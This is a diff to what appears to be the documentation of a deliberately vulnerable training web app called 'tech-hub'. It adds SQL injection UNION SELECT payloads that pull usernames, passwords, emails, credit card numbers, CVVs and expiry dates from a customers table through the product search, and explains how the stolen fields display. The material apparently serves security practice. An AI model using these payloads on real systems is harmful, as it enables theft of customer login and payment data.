@@ -136,9 +136,19 @@ tech-hub/
 /techhub/products?search=' UNION SELECT id,username,password,email,credit_card,cvv,expiration,null FROM customers --
 ```
 
-**SQL Injection - Extract Specific Customer Fields:**
+The injected customer data will be displayed in the product grid as:
+- **Field 1 (Title)**: Username (e.g., patricia.sandoval)
+- **Field 2**: Password (e.g., password123)
+- **Field 3**: Email
+- **Field 4 (RED)**: 💳 Credit Card Number (e.g., 4532-1234-5678-9010)
+- **Field 5**: CVV (e.g., 847)
+- **Field 6**: Expiration Date (e.g., 03/27)
+- **Field 7**: null
+- **Field 8**: Customer ID
+
+**SQL Injection - With Labeled Data (More Readable):**
 ```
-/techhub/products?search=' UNION SELECT id,username,email,full_name,credit_card,cvv,expiration,created_at FROM customers --
+/techhub/products?search=' UNION SELECT id,'User: ' || username,'Pass: ' || password,'Email: ' || email,'💳 CC: ' || credit_card,'CVV: ' || cvv,'Exp: ' || expiration,'ID: ' || id FROM customers --
 ```
 
 ### Login Bypass
